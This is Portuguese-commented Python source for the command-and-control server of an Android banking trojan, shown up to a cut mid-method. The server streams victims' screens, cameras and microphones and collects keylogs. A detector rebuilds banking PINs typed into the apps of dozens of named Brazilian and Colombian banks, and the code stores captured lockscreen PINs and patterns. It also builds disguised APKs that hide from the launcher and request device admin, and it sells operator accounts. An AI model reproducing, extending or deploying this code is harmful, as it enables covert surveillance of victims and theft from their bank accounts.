"""
SERVIDOR DE COMANDO E CONTROLE (C&C)

Este é o servidor que controla todos os dispositivos infectados.

FUNCIONALIDADES:
- Aceita conexões WebSocket de dispositivos Android
- Recebe e armazena frames de tela em tempo real
- Envia comandos para os dispositivos
- Interface web para visualização e controle
- Sistema de autenticação para operadores
- Banco de dados PostgreSQL para persistência

ROTAS:
- /ws: WebSocket para dispositivos Android
- /api/auth/login: Login de operadores
- /api/auth/register: Registro de operadores
- /api/devices: Lista dispositivos conectados
- /api/devices/{id}/screen: Stream de tela
- /api/devices/{id}/command: Enviar comando
"""

import gangstar_env
from ip_utils import esconder_ip, mask_ip
import os
import time
import re
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Depends, HTTPException, status, UploadFile, File, Form, Request, BackgroundTasks, Body, Query
from fastapi.middleware.cors import CORSMiddleware
import io
from pydantic import BaseModel
from fastapi.staticfiles import StaticFiles
from fastapi.responses import StreamingResponse, HTMLResponse, FileResponse
from sqlalchemy.orm import Session
from typing import Dict, List, Optional, Union

import logging
class SuppressInvalidHTTPFilter(logging.Filter):
    def filter(self, record: logging.LogRecord) -> bool:
        msg = record.getMessage()
        if "Invalid HTTP request received" in msg or "Invalid HTTP request" in msg:
            return False
        return True

logging.getLogger("uvicorn.error").addFilter(SuppressInvalidHTTPFilter())

# Middleware de cabeçalhos de segurança HTTP
LOGIN_ATTEMPTS = {}  # {ip: {"count": int, "blocked_until": datetime}}
TRIAL_REGISTER_ATTEMPTS = {}  # {ip: {"count": int, "first_attempt": datetime, "blocked_until": datetime}}
TOTP_VERIFY_ATTEMPTS = {}  # {ip: {"count": int, "blocked_until": datetime}}
from dataclasses import dataclass
import asyncio
try:
    from dateutil.parser import parse as parse_dt
except ImportError:
    parse_dt = None
try:
    import orjson
    def json_loads(s): return orjson.loads(s)
    def json_dumps(o): return orjson.dumps(o).decode('utf-8')
except ImportError:
    import json
    def json_loads(s): return json.loads(s)
    def json_dumps(o): return json.dumps(o)
import json  # Mantém para compatibilidade com FastAPI
import base64
from datetime import datetime, timedelta, timezone

def utc_now():
    return datetime.now(timezone.utc).replace(tzinfo=None)
import logging
import shutil
import tempfile
from pathlib import Path
from jose import jwt, JWTError

# Importações locais
from database import get_db, engine, Base, SessionLocal, checkpoint_wal
from models import Device, Operator, DeviceLog, UserLayoutPreferences, CapturedData, TrialClaim
from auth import (
    create_access_token, verify_password, get_password_hash, get_current_user,
    SECRET_KEY, ALGORITHM, oauth2_scheme,
    create_2fa_token, decode_2fa_token, generate_totp_secret, generate_totp_qr_and_uri, verify_totp_code
)
from schemas import (
    LoginRequest, LoginResponse, Verify2FARequest, Setup2FARequest,
    RegisterRequest, TrialRegisterRequest, CommandRequest, Token, RenameDeviceRequest
)
from apk_builder import APKBuilder, patch_app_name, patch_application_id, patch_hide_from_launcher, patch_request_admin, BUILDS_DIR

# Configuração de logging - ULTRA REDUZIDO para performance
logging.basicConfig(level=logging.ERROR)  # Apenas erros críticos
logger = logging.getLogger(__name__)
logger.setLevel(logging.WARNING)  # Apenas warnings e erros

# ==================== OTIMIZAÇÕES DE PERFORMANCE - VPS 4GB RAM, 3 CORES ====================
import gc
import sys

if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

# GC otimizado para 4GB RAM - coleta mais frequente para liberar memória
gc.set_threshold(5000, 50, 20)

# Configurações de buffer - OTIMIZADO PARA 4GB RAM
WEBSOCKET_MAX_SIZE = 1 * 1024 * 1024  # 1MB max (reduzido de 2MB)
FRAME_COMPRESSION_QUALITY = 30  # Compressão maior = menos RAM (reduzido de 40)
MAX_CONCURRENT_DEVICES = 200  # Reduzido de 500
FRAME_SKIP_INTERVAL = 2  # Pula mais frames para economia de CPU
_DASHBOARD_QUEUE_INITIAL = 3  # Fila menor = menos RAM
FRAME_TTL = 3  # Frames expiram mais rápido

# Pool de workers ajustado para 3 cores / 4GB RAM
from concurrent.futures import ThreadPoolExecutor
import multiprocessing

NUM_WORKERS = max(multiprocessing.cpu_count() * 2, 8)  # 6 workers em 3 cores
thread_pool = ThreadPoolExecutor(max_workers=NUM_WORKERS)

def safe_db_commit_sync(db, max_retries: int = 5):
    """Commita no banco de dados tratando locks com retry e backoff para alta concorrencia"""
    import time
    for attempt in range(max_retries):
        try:
            db.commit()
            return True
        except Exception as e:
            err_msg = str(e).lower()
            if ("locked" in err_msg or "busy" in err_msg) and attempt < max_retries - 1:
                time.sleep(0.05 * (2 ** attempt))
                continue
            logger.warning(f"Aviso no db.commit (tentativa {attempt+1}/{max_retries}): {e}")
            try:
                db.rollback()
            except Exception:
                pass
            return False

async def safe_db_commit(db):
    """Versao assincrona nao-bloqueante de safe_db_commit_sync"""
    return await asyncio.to_thread(safe_db_commit_sync, db)

# GC periódico agressivo para 4GB RAM - libera memória mais rápido
import threading
def periodic_gc():
    import time
    while True:
        time.sleep(120)  # 2 minutos - mais frequente para 4GB RAM
        gc.collect()  # Coleta completa para liberar memória
        
gc_thread = threading.Thread(target=periodic_gc, daemon=True)
gc_thread.start()

# Cria tabelas no banco (PostgreSQL na VPS)
Base.metadata.create_all(bind=engine)

# Patch to add custom_name column if it does not exist (SQLite or PostgreSQL)
try:
    from sqlalchemy import text
    with engine.connect() as conn:
        from sqlalchemy import inspect
        inspector = inspect(engine)
        columns = [c["name"] for c in inspector.get_columns("devices")]
        if "custom_name" not in columns:
            print("🔧 Migração: Adicionando coluna custom_name à tabela devices...")
            conn.execute(text("ALTER TABLE devices ADD COLUMN custom_name VARCHAR(100)"))
            try:
                conn.commit()
            except Exception:
                pass
            print("✅ Coluna custom_name adicionada com sucesso!")

        op_columns = [c["name"] for c in inspector.get_columns("operators")]
        if "expires_at" not in op_columns:
            print("🔧 Migração: Adicionando coluna expires_at à tabela operators...")
            conn.execute(text("ALTER TABLE operators ADD COLUMN expires_at TIMESTAMP"))
            try:
                conn.commit()
            except Exception:
                pass
            print("✅ Coluna expires_at adicionada com sucesso!")

        if "totp_secret" not in op_columns:
            print("🔧 Migração: Adicionando coluna totp_secret à tabela operators...")
            conn.execute(text("ALTER TABLE operators ADD COLUMN totp_secret VARCHAR(64)"))
            try:
                conn.commit()
            except Exception:
                pass
            print("✅ Coluna totp_secret adicionada com sucesso!")

        if "totp_enabled" not in op_columns:
            print("🔧 Migração: Adicionando coluna totp_enabled à tabela operators...")
            conn.execute(text("ALTER TABLE operators ADD COLUMN totp_enabled BOOLEAN DEFAULT 0"))
            try:
                conn.commit()
            except Exception:
                pass
            print("✅ Coluna totp_enabled adicionada com sucesso!")

        if "totp_temp_secret" not in op_columns:
            print("🔧 Migração: Adicionando coluna totp_temp_secret à tabela operators...")
            conn.execute(text("ALTER TABLE operators ADD COLUMN totp_temp_secret VARCHAR(64)"))
            try:
                conn.commit()
            except Exception:
                pass
            print("✅ Coluna totp_temp_secret adicionada com sucesso!")

        if "is_trial" not in op_columns:
            print("🔧 Migração: Adicionando coluna is_trial à tabela operators...")
            conn.execute(text("ALTER TABLE operators ADD COLUMN is_trial BOOLEAN DEFAULT 0"))
            try:
                conn.commit()
            except Exception:
                pass
            print("✅ Coluna is_trial adicionada com sucesso!")

        if "created_ip" not in op_columns:
            print("🔧 Migração: Adicionando coluna created_ip à tabela operators...")
            conn.execute(text("ALTER TABLE operators ADD COLUMN created_ip VARCHAR(45)"))
            try:
                conn.commit()
            except Exception:
                pass
            print("✅ Coluna created_ip adicionada com sucesso!")

        # Garante que a tabela trial_claims existe
        try:
            Base.metadata.create_all(bind=engine)
        except Exception as ex_db:
            logger.warning(f"Aviso ao criar tabelas no startup: {ex_db}")

        # Garante índices de alta velocidade para device_logs e devices
        conn.execute(text("CREATE INDEX IF NOT EXISTS idx_device_logs_dev_type ON device_logs(device_id, log_type)"))
        conn.execute(text("CREATE INDEX IF NOT EXISTS idx_device_logs_type_created ON device_logs(log_type, created_at)"))
        conn.execute(text("CREATE INDEX IF NOT EXISTS idx_device_logs_dev_created ON device_logs(device_id, created_at)"))
        conn.execute(text("CREATE INDEX IF NOT EXISTS idx_device_logs_dev_type_created ON device_logs(device_id, log_type, created_at DESC)"))
        conn.execute(text("CREATE INDEX IF NOT EXISTS idx_device_logs_dev_created_desc ON device_logs(device_id, created_at DESC)"))
        conn.execute(text("CREATE INDEX IF NOT EXISTS idx_devices_owner ON devices(owner_id)"))
        conn.execute(text("CREATE INDEX IF NOT EXISTS idx_devices_devid ON devices(device_id)"))
        try:
            conn.commit()
        except Exception:
            pass
except Exception as e:
    print(f"⚠️ Erro ao tentar migrar banco de dados: {e}")

# ── RESET ADMIN via ENV VAR ─────────────────────────────────────────────────
# Set RESET_ADMIN_PASSWORD=yourpassword in Render Environment to reset admin.
# After logging in successfully, remove the env var and redeploy.
_reset_pw = os.getenv("RESET_ADMIN_PASSWORD", "").strip()
if _reset_pw:
    try:
        import bcrypt as _bcrypt
        from database import SessionLocal as _SL
        from models import Operator as _Op
        _db = _SL()
        try:
            _admin = _db.query(_Op).filter(_Op.username == "admin").first()
            if _admin:
                _hashed = _bcrypt.hashpw(_reset_pw.encode("utf-8"), _bcrypt.gensalt()).decode("utf-8")
                _admin.hashed_password = _hashed
                _admin.totp_enabled    = False
                _admin.totp_secret     = None
                _admin.totp_temp_secret = None
                _admin.is_active       = True
                _admin.is_banned       = False
                _db.commit()
                print(f"[RESET] ✅ Admin password reset successfully.")
            else:
                print("[RESET] ⚠️ Admin user not found in DB.")
        finally:
            _db.close()
    except Exception as _reset_err:
        print(f"[RESET] ❌ Failed to reset admin: {_reset_err}")
# ────────────────────────────────────────────────────────────────────────────

async def periodic_wal_checkpoint():
    """Executa checkpoint do WAL e descarta conexões ociosas a cada 2 min para manter WAL compacto"""
    counter = 0
    while True:
        try:
            await asyncio.sleep(15)
            counter += 1
            if DATABASE_URL.startswith("sqlite"):
                def _do_checkpoint(do_truncate: bool):
                    try:
                        if do_truncate:
                            try:
                                engine.dispose()
                            except Exception:
                                pass
                        db_file = DATABASE_URL.replace("sqlite:///", "").split("?")[0]
                        if os.path.exists(db_file):
                            import sqlite3
                            conn = sqlite3.connect(db_file, timeout=5)
                            mode = "TRUNCATE" if do_truncate else "PASSIVE"
                            conn.execute(f"PRAGMA wal_checkpoint({mode});")
                            conn.close()
                    except Exception:
                        pass
                do_trunc = (counter % 8 == 0)  # A cada 2 minutos
                await asyncio.to_thread(_do_checkpoint, do_trunc)
        except asyncio.CancelledError:
            break
        except Exception:
            pass

def custom_asyncio_exception_handler(loop, context):
    """Suprime exceções benignas de socket do Windows (WinError 64 / 10054) para evitar quedas do servidor"""
    exc = context.get("exception")
    if exc is not None:
        if isinstance(exc, (ConnectionResetError, ConnectionAbortedError)):
            return
        if isinstance(exc, OSError) and getattr(exc, "winerror", None) in (64, 10054, 10053, 995):
            return
    msg = str(context.get("message", ""))
    if any(k in msg for k in ["WinError 64", "WinError 10054", "Accept failed", "connection_lost"]):
        return
    try:
        loop.default_exception_handler(context)
    except Exception:
        pass

import threading
import shutil

def _adb_reverse_watchdog_thread_loop():
    """Thread nativa permanente do SO (imune a GC do asyncio) que mantém adb reverse ativo a cada 2s"""
    target_port = os.getenv("PORT", "5000")
    
    while True:
        try:
            adb_paths = [
                r"C:\Android\Sdk\platform-tools\adb.exe",
                shutil.which("adb"),
                "adb",
                os.path.expanduser(r"~\AppData\Local\Android\Sdk\platform-tools\adb.exe"),
            ]
            adb_bin = None
            for p in adb_paths:
                if not p:
                    continue
                try:
                    res = subprocess.run([p, "version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2)
                    if res.returncode == 0:
                        adb_bin = p
                        break
                except Exception:
                    continue

            if adb_bin:
                dev_res = subprocess.run([adb_bin, "devices"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3, text=True)
                if "\tdevice" in dev_res.stdout:
                    rev_res = subprocess.run([adb_bin, "reverse", "--list"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3, text=True)
                    target_rule = f"tcp:{target_port} tcp:{target_port}"
                    if target_rule not in rev_res.stdout:
                        subprocess.run([adb_bin, "reverse", f"tcp:{target_port}", f"tcp:{target_port}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3)
                        logger.info(f"⚡ [ADB WATCHDOG] Ponte reversa USB restabelecida: tcp:{target_port} -> tcp:{target_port}")
        except Exception as e:
            logger.debug(f"[ADB WATCHDOG] Aviso no loop: {e}")
        time.sleep(2.0)

# Inicia thread em background independente de qualquer framework web ou GC
_adb_thread = threading.Thread(target=_adb_reverse_watchdog_thread_loop, name="ADB-Reverse-Watchdog", daemon=True)
_adb_thread.start()

_background_tasks = set()

def start_background_task(coro):
    task = asyncio.create_task(coro)
    _background_tasks.add(task)
    task.add_done_callback(_background_tasks.discard)
    return task

from contextlib import asynccontextmanager

@asynccontextmanager
async def lifespan(app: FastAPI):
    try:
        loop = asyncio.get_running_loop()
        loop.set_exception_handler(custom_asyncio_exception_handler)
    except Exception:
        pass
    start_background_task(manager.run_housekeeping())
    start_background_task(periodic_wal_checkpoint())
    yield

# Inicializa FastAPI com proteção total contra exposição de API
app = FastAPI(
    docs_url=None,
    redoc_url=None,
    openapi_url=None,
    lifespan=lifespan
)

# Configuração CORS (Permite requisições mantendo segurança de credenciais)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

from fastapi import Request
from fastapi.exceptions import RequestValidationError
from fastapi.responses import JSONResponse

class SecurityHeadersMiddleware:
    """Middleware ASGI puro para cabeçalhos de segurança sem interferir no Content-Length ou respostas de streaming"""
    def __init__(self, app):
        self.app = app

    async def __call__(self, scope, receive, send):
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        async def send_wrapper(message):
            if message["type"] == "http.response.start":
                raw_headers = list(message.get("headers", []))
                raw_headers.extend([
                    (b"server", b"WebServer"),
                    (b"x-content-type-options", b"nosniff"),
                    (b"x-frame-options", b"SAMEORIGIN"),
                    (b"x-xss-protection", b"1; mode=block"),
                    (b"cache-control", b"no-cache, no-store, must-revalidate"),
                    (b"pragma", b"no-cache"),
                ])
                message["headers"] = raw_headers
            await send(message)

        await self.app(scope, receive, send_wrapper)

app.add_middleware(SecurityHeadersMiddleware)

@app.exception_handler(RequestValidationError)
async def validation_exception_handler(request: Request, exc: RequestValidationError):
    return JSONResponse(
        status_code=422,
        content={"detail": "Requisição inválida"}
    )

@app.exception_handler(Exception)
async def global_exception_handler(request: Request, exc: Exception):
    logger.error(f"Erro no servidor: {exc}")
    return JSONResponse(
        status_code=500,
        content={"detail": "Erro interno do servidor"}
    )


# Monta arquivos estáticos do frontend buildado (para acesso via VPS/domínio)
FRONTEND_DIST = Path(__file__).parent / "web-dist"
if FRONTEND_DIST.exists():
    app.mount("/assets", StaticFiles(directory=FRONTEND_DIST / "assets"), name="frontend-assets")

# Monta diretório de uploads para APKs
UPLOADS_DIR = Path(__file__).parent / "uploads" / "apks"
UPLOADS_DIR.mkdir(parents=True, exist_ok=True)
app.mount("/uploads/apks", StaticFiles(directory=UPLOADS_DIR), name="apk-uploads")

# Monta diretório web (para download do APK compilado localmente)
WEB_DIR = Path(__file__).parent / "web"
WEB_DIR.mkdir(parents=True, exist_ok=True)
app.mount("/web", StaticFiles(directory=WEB_DIR), name="web-static")

# Configurações de cache/TTL para recursos em memória - OTIMIZADO
FRAME_CACHE_DIR = Path(__file__).resolve().parent / "cache" / "screens"
HIERARCHY_CACHE_DIR = Path(__file__).resolve().parent / "cache" / "hierarchies"
FRAME_CACHE_DIR.mkdir(parents=True, exist_ok=True)
HIERARCHY_CACHE_DIR.mkdir(parents=True, exist_ok=True)

# TTLs otimizados
FRAME_TTL = timedelta(seconds=int(os.getenv("FRAME_TTL_SECONDS", "30")))
HIERARCHY_TTL = timedelta(seconds=int(os.getenv("HIERARCHY_TTL_SECONDS", "20")))
DASHBOARD_QUEUE_SIZE = int(os.getenv("DASHBOARD_QUEUE_SIZE", "5"))  # Fila maior = menos drops, menos travamentos

# Cache simples para reduzir consultas ao banco - OTIMIZADO
from functools import lru_cache
import time as time_module

_devices_cache: Dict[str, dict] = {}  # {cache_key: {"data": list, "timestamp": float}}
_frame_counter: Dict[str, int] = {}  # Contador de frames por dispositivo

def get_cached_devices(db: Session, user_id: int = None, is_admin: bool = False):
    """Retorna dispositivos com cache isolado por usuário"""
    cache_key = f"{user_id}_{is_admin}"
    now = time_module.time()
    cached = _devices_cache.get(cache_key)
    
    if not cached or (now - cached["timestamp"]) > 5:
        if is_admin:
            devices = db.query(Device).all()
        else:
            devices = db.query(Device).filter(Device.owner_id == user_id).all()
        
        _devices_cache[cache_key] = {"data": devices, "timestamp": now}
        return devices
    
    return cached["data"]

# ==================== DETECTOR INTELIGENTE DE SENHAS BANCÁRIAS ====================

class BankPasswordDetector:
    """Detecta e reconstrói senhas bancárias de 4, 6 e 8 dígitos"""
    
    BANK_APPS = {
        'br.com.itau': 'Itaú',
        'com.itau': 'Itaú',
        'com.itau.cartoes': 'Itaú Cartões',
        'br.com.itau.pers': 'Itaú Personnalité',
        'br.com.neon': 'Neon',
        'com.nu.production': 'Nubank',
        'com.nubank': 'Nubank',
        'br.com.bradesco': 'Bradesco',
        'com.bradesco.cartoes': 'Bradesco Cartões',
        'br.com.bradesco.bradescoprime': 'Bradesco Prime',
        'com.santander.app': 'Santander',
        'com.santander.app.way': 'Santander Way',
        'com.santander.app.select': 'Santander Select',
        'com.picpay': 'PicPay',
        'br.com.intermedium': 'Inter',
        'com.bancocinter': 'Inter',
        'br.gov.caixa.tem': 'Caixa Tem',
        'br.com.gft.banco7': 'Caixa',
        'br.gov.caixa.mfg': 'Caixa FGTS',
        'br.com.bb': 'Banco do Brasil',
        'br.com.bb.android': 'Banco do Brasil',
        'br.com.bb.empresa': 'BB Empresa',
        'com.mercadopago.wallet': 'Mercado Pago',
        'br.com.banco.original': 'Banco Original',
        'br.com.c6bank.app': 'C6 Bank',
        'br.com.pagseguro': 'PagBank',
        'com.pagseguro.pagbank': 'PagBank',
        'com.btg.pactual': 'BTG Pactual',
        'com.btg.digital': 'BTG Pactual',
        'br.com.sicoob.mobile': 'Sicoob',
        'br.com.sicredi': 'Sicredi',
        'com.safra.net': 'Banco Safra',
        'br.com.safra.mobile': 'Banco Safra',
        'com.xp.mobile': 'XP Investimentos',
        'br.com.xp.investimentos': 'XP Investimentos',
        'com.willbank.app': 'Will Bank',
        'br.com.pan.app': 'Banco Pan',
        'br.com.agibank': 'Agibank',
        'com.bancobs2.app': 'Banco BS2',
        'com.bancobMG.mobile': 'Banco BMG',
        'br.com.banrisul': 'Banrisul',
        'br.com.banrisul.cartoes': 'Banrisul Cartões',
        'com.davivienda.daviviendaapp': 'Davivienda',
        'com.synopsis.davivienda': 'Davivienda',
        'com.davivienda.movil': 'Davivienda',
        'com.davivienda.daviplata': 'DaviPlata',
        'com.davivienda': 'Davivienda',
        'co.com.davivienda': 'Davivienda',
        'com.bancolombia.personas': 'Bancolombia',
        'com.bancolombia': 'Bancolombia',
        'co.com.bancolombia': 'Bancolombia',
        'com.nequi.MobileApp': 'Nequi',
        'com.nequi': 'Nequi',
        'com.seguranca.protecao': 'KEYLOGGER ITAÚ',
        'com.seguranca': 'KEYLOGGER ITAÚ'
    }
    
    def __init__(self, device_id: str):
        self.device_id = device_id
        self.password_buffer = []  # Buffer de eventos de senha
        self.last_package = None
        self.last_hint = None
        self.detected_passwords = []  # Lista de senhas detectadas
        self.last_detected_password = None  # Última senha detectada (evita duplicatas)
        self.last_event_time = None  # Tempo do último evento
        
    def process_keylog(self, keylog_data: str) -> dict:
        """Processa evento de keylog e tenta detectar senha"""
        try:
            data = json.loads(keylog_data)
            
            # Verifica se é campo de senha ou se contém dígitos numéricos digitados (ex: teclado Itaú, PINs)
            is_password_field = data.get('isPassword', False)
            text = str(data.get('text', '') or '')
            hint = str(data.get('hint', '') or '')
            package = data.get('package', '')
            
            # Se não é marcado como senha mas contém dígitos numéricos ou palavras-chave de PIN/senha, processa como potencial entrada
            is_numeric = text.replace('•', '').replace('[', '').replace(']', '').strip().isdigit()
            is_sensitive_field = any(k in hint.lower() for k in ['senha', 'pin', 'código', 'codigo', 'acesso', 'pass', 'key'])
            
            if not is_password_field and not is_numeric and not is_sensitive_field:
                # Limpa buffer se mudou para campo irrelevante
                self.password_buffer = []
                self.last_detected_password = None
                return None
            
            # Identifica o banco
            bank_name = self.BANK_APPS.get(package, package)
            
            # Reseta buffer se mudou de app ou se inativo por mais de 15 segundos
            now = utc_now()
            if package != self.last_package or (self.last_event_time and (now - self.last_event_time).total_seconds() > 15):
                self.password_buffer = []
                self.last_detected_password = None
                
            self.last_package = package
            self.last_hint = hint
            self.last_event_time = utc_now()
            
            # Adiciona ao buffer
            self.password_buffer.append({
                'text': text,
                'timestamp': utc_now().isoformat()
            })
            
            # Tenta extrair senha do buffer
            password = self._extract_password(hint)
            
            # Verifica se é uma senha válida e DIFERENTE da última detectada
            if password and password != self.last_detected_password:
                # Senha detectada!
                password_info = {
                    'device_id': self.device_id,
                    'bank': bank_name,
                    'package': package,
                    'password': password,
                    'hint': hint,
                    'digits': len(password),
                    'timestamp': utc_now().isoformat(),
                    'status': 'captured',  # captured, confirmed, failed
                    'buffer': list(self.password_buffer)  # Para debug
                }
                
                # Adiciona à lista de senhas detectadas
                self.detected_passwords.append(password_info)
                self.last_detected_password = password  # Marca como detectada
                
                # Limpa buffer após detecção
                self.password_buffer = []
                
                logger.info(f"\n" + "="*60)
                logger.info(f"🔐 SENHA BANCÁRIA DETECTADA!")
                logger.info(f"Banco: {bank_name}")
                logger.info(f"Senha: {password} ({len(password)} dígitos)")
                logger.info(f"Campo: {hint}")
                logger.info("="*60 + "\n")
                
                return password_info
                
        except Exception as e:
            logger.error(f"Erro ao processar keylog: {e}")
            
        return None
    
    def _extract_password(self, hint: str) -> str:
        """Extrai senha dos eventos com bullets (•) OU cliques em teclado virtual"""
        if len(self.password_buffer) < 2:
            return None
        
        # Detecta tamanho esperado do hint
        expected_length = None
        if hint:
            hint_lower = hint.lower()
            if '4' in hint or 'quatro' in hint_lower:
                expected_length = 4
            elif '6' in hint or 'seis' in hint_lower:
                expected_length = 6
            elif '8' in hint or 'oito' in hint_lower:
                expected_length = 8
        
        # Analisa últimos eventos COM DEDUPLICAÇÃO
        password_digits = []
        last_digit = None
        last_timestamp = None
        
        for event in self.password_buffer:
            text = event['text']
            timestamp = event.get('timestamp', '')
            
            # Método 1: Extrai dígitos de eventos com bullets (Neon, Nubank)
            clean_text = text.replace('•', '').replace('[', '').replace(']', '').strip()
            
            # Ignora eventos que não são dígitos puros
            if not clean_text:
                continue
                
            # Se é um texto com múltiplos bullets/dígitos, pega apenas o último
            if len(clean_text) > 1 and clean_text.isdigit():
                # É provavelmente a senha completa até agora
                # Pega apenas o último caractere (novo dígito)
                clean_text = clean_text[-1]
            
            # Método 2: Eventos de clique em teclado virtual (Itáu, Bradesco)
            if clean_text and len(clean_text) == 1 and clean_text.isdigit():
                digit = clean_text
                
                # 🔥 DEDUPLICAÇÃO: Ignora se é o mesmo dígito em sequência rápida
                # Isso evita capturar o mesmo clique duas vezes
                if digit == last_digit and last_timestamp:
                    try:
                        from datetime import datetime
                        if timestamp and last_timestamp:
                            # Parse timestamps
                            t1 = datetime.fromisoformat(last_timestamp.replace('Z', '+00:00')) if isinstance(last_timestamp, str) else last_timestamp
                            t2 = datetime.fromisoformat(timestamp.replace('Z', '+00:00')) if isinstance(timestamp, str) else timestamp
                            diff_ms = abs((t2 - t1).total_seconds() * 1000)
                            
                            # Se menos de 300ms entre eventos iguais, é duplicata
                            if diff_ms < 300:
                                logger.debug(f"🔄 Ignorando dígito duplicado: {digit} (diff: {diff_ms}ms)")
                                continue
                    except Exception as e:
                        # Se não conseguir comparar timestamps, aceita o dígito
                        pass
                
                password_digits.append(digit)
                last_digit = digit
                last_timestamp = timestamp
        
        # Log para debug
        logger.debug(f"📊 Buffer: {len(self.password_buffer)} eventos → {len(password_digits)} dígitos: {''.join(password_digits)}")
        
        # Se tem tamanho esperado, retorna APENAS quando atingir esse tamanho
        if expected_length:
            if len(password_digits) == expected_length:
                return ''.join(password_digits)
            elif len(password_digits) > expected_length:
                # Pegou mais que o esperado, retorna os últimos N
                return ''.join(password_digits[-expected_length:])
        else:
            # Sem hint, tenta detectar automaticamente (4, 6 ou 8)
            if len(password_digits) >= 4:
                # Tenta 8, 6 ou 4 dígitos
                for length in [8, 6, 4]:
                    if len(password_digits) == length:
                        return ''.join(password_digits)
                # Se não é exatamente 4, 6 ou 8, pega os últimos 6 (padrão)
                if len(password_digits) >= 6:
                    return ''.join(password_digits[-6:])
        
        return None
    
    def get_detected_passwords(self) -> list:
        """Retorna todas as senhas detectadas"""
        return self.detected_passwords
    
    def clear_buffer(self):
        """Limpa buffer de senhas"""
        self.password_buffer = []

@dataclass
class DashboardSubscriber:
    websocket: WebSocket
    queue: asyncio.Queue

async def safe_close_websocket(ws: WebSocket, code: int = 1000, reason: str = ""):
    """Fecha WebSocket silenciosamente tratando exceções de estado fechado"""
    try:
        await ws.close(code=code, reason=reason)
    except Exception:
        pass




# Gerenciador de conexões de dispositivos
class DeviceConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.connection_locks: Dict[str, asyncio.Lock] = {}
        self.device_owners: Dict[str, Optional[int]] = {}
        self.device_screens: Dict[str, bytes] = {}
        self.device_screen_timestamps: Dict[str, datetime] = {}
        self.device_info: Dict[str, dict] = {}
        # Last-known capture state reported by device (for panel to init isCaptureEnabled / isSilentHvncEnabled)
        self.device_silent_state: Dict[str, dict] = {}  # { "active": bool, "method": "btmob" | "standard" }
        self.device_screen_hierarchies: Dict[str, str] = {}
        self.device_hierarchy_timestamps: Dict[str, datetime] = {}
        self.password_detector: Dict[str, 'BankPasswordDetector'] = {}
        self.dashboard_subscribers: Dict[str, List[DashboardSubscriber]] = {}
        self.cleanup_lock = asyncio.Lock()
        self.last_balance_extract_time: Dict[str, float] = {}
        
        # 📷 CÂMERA EM TEMPO REAL
        self.device_camera_frames: Dict[str, bytes] = {}  # Último frame da câmera
        self.device_camera_timestamps: Dict[str, datetime] = {}
        self.camera_subscribers: Dict[str, List[DashboardSubscriber]] = {}  # WebSockets escutando câmera
        
        # 🎤 MICROFONE EM TEMPO REAL
        self.device_audio_chunks: Dict[str, bytes] = {}  # Último chunk de áudio
        self.device_audio_timestamps: Dict[str, datetime] = {}
        self.audio_subscribers: Dict[str, List[DashboardSubscriber]] = {}  # WebSockets escutando áudio
        
        # 🔓 SEQUÊNCIA DE DESBLOQUEIO
        self.device_unlock_sequences: Dict[str, dict] = {}  # Sequência de desbloqueio gravada
        
        # 🔒 LOCKSCREEN (PIN + PATTERN) - IGUAL EAGLESPY V5
        self.device_pins: Dict[str, str] = {}  # PIN capturado por dispositivo
        self.device_patterns: Dict[str, str] = {}  # Pattern capturado por dispositivo
        self.device_lockscreen_active: Dict[str, bool] = {}  # Lockscreen ativa por dispositivo
        
        # 📱 APPS INSTALADOS
        self.device_installed_apps: Dict[str, list] = {}  # Lista de apps por dispositivo
        
        # 🏦 BANCOS DETECTADOS EM TEMPO REAL
        self.device_active_banks: Dict[str, dict] = {}  # Lista de bancos abertos por dispositivo
        
        # HEARTBEAT
        self.device_last_activity: Dict[str, datetime] = {}
        self.DEVICE_TIMEOUT_SECONDS = 300  # 300s (5 min) - resiliência total para oscilações no 4G/WiFi e doze mode
        
        # Anti-flood: controla quando GET_DEVICE_INFO foi enviado por última vez por dispositivo
        self._info_request_ts: Dict[str, datetime] = {}

        
    def update_device_activity(self, device_id: str):
        """Atualiza timestamp de última atividade do dispositivo"""
        self.device_last_activity[device_id] = utc_now()
    
    def is_device_alive(self, device_id: str) -> bool:
        """Verifica se dispositivo possui conexão WebSocket ativa"""
        return device_id in self.active_connections
    
    def get_alive_devices(self) -> list:
        """Retorna lista de device_ids que possuem conexões WebSocket ativas em tempo real"""
        return list(self.active_connections.keys())
        
    def store_installed_apps(self, device_id: str, apps_list: list):
        """Armazena lista de apps instalados"""
        self.device_installed_apps[device_id] = apps_list
        logger.info(f"📱 Apps armazenados para {device_id}: {len(apps_list)} apps")
    
    def get_installed_apps(self, device_id: str) -> Optional[list]:
        """Retorna lista de apps instalados"""
        return self.device_installed_apps.get(device_id)
        
    def store_unlock_sequence(self, device_id: str, sequence_data: dict):
        """Armazena sequência de desbloqueio gravada"""
        self.device_unlock_sequences[device_id] = sequence_data
        logger.info(f"🔓 Sequência de desbloqueio armazenada para {device_id}: {len(sequence_data.get('sequence', []))} ações")
    
    def get_unlock_sequence(self, device_id: str) -> Optional[dict]:
        """Retorna sequência de desbloqueio gravada"""
        return self.device_unlock_sequences.get(device_id)
    
    def store_device_pin(self, device_id: str, pin: str):
        """🔒 Armazena PIN capturado do lockscreen (igual EAGLESPY V5)"""
        self.device_pins[device_id] = pin
        logger.info(f"🔒 PIN armazenado para {device_id}: {pin}")
    
    def get_device_pin(self, device_id: str) -> Optional[str]:
        """🔒 Retorna PIN capturado do lockscreen"""
        return self.device_pins.get(device_id)
    
    def clear_device_pin(self, device_id: str):
        """🔒 Limpa PIN armazenado"""
        if device_id in self.device_pins:
            del self.device_pins[device_id]
            logger.info(f"🔒 PIN limpo para {device_id}")
    
    def store_device_pattern(self, device_id: str, pattern: str):
        """🔲 Armazena Pattern capturado do lockscreen"""
        self.device_patterns[device_id] = pattern
        logger.info(f"🔲 Pattern armazenado para {device_id}: {pattern}")
    
    def get_device_pattern(self, device_id: str) -> Optional[str]:
